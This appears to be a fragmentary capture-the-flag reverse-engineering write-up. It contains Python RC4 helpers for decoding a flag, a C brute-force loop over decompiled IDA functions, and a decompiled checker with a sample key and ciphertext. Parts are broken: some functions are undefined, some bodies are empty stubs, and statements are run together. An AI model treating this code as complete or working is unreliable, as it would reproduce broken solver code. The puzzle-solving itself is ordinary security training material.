def enc1(tmp): tmp = bytes(tmp) key = bytes([0x70, 0x6f, 0x77, 0x65, 0x72]) ct = b'' for i in range(len(tmp)): ct = ARC4.new(key).encrypt(tmp) key = ARC4.new(ct).encrypt(key) # update key return ct+key

def dec1(tmp): ct = bytes(tmp[:-5]) key = bytes(tmp[-5:]) key = ARC4.new(ct).encrypt(key) # update key ct = ARC4.new(key).encrypt(ct) return ct

flag = dec2(flag)flag = dec2(flag)flag = dec3(flag)flag = dec2(flag)flag = dec2(flag)flag = dec2(flag)print(flag)print(len(flag))print(dec1(flag))
a = bytes([1,2,3,4,5])test = list(enc1(a))print('--------')print(list(dec1(test)))
    #include "defs.h"
    #include <stdio.h>#include <memory.h>#include <stdint.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <ctype.h>
void sub_402001(uint32_t *a1, uint8_t *a2){ // 从IDA里复制代码}
int sub_4020F7(uint32_t *a1){ // 从IDA里复制代码}
int main() { uint8_t ct2[16] = {}; uint8_t ct[16] = {}; int a1[192]; for (int i = 0; i < 0x10; i++) { for (int ch = 0; ch < 0x100; ch++) { memcpy(ct, ct2, i); ct[i] = ch; sub_402001((uint32_t *)a1, ct); int res = sub_4020F7((uint32_t *)a1); if (res > i) { printf("[%d] %d %02Xn", i, res, ch); ct2[i] = ch; break; } } } return 0;}
int __cdecl main(int argc, const char **argv, const char **envp){ int a1[192]; // [rsp+A0h] [rbp+20h] BYREF uint8_t ct[80]; // [rsp+3A0h] [rbp+320h] BYREF
 sub_402B00(); scanf( "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x", inp, &inp[1], &inp[2], &inp[3], &inp[4], &inp[5], &inp[6], &inp[7], &inp[8], &inp[9], &inp[10], &inp[11], &inp[12], &inp[13], &inp[14], &inp[15]); // 4d87ef03-77bb-491a-80f5-4620245807c4 aes(inp, key, ct); // ct: 12 8F EC C2 85 04 B2 4C 5B BA 4A CF 11 36 0A 48 // key: 3577402ECCA44A3F9AB72182F9B01F35 sub_402001((uint32_t *)a1, ct); if ( sub_4020F7((uint32_t *)a1) ) printf("Right"); return 0;}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]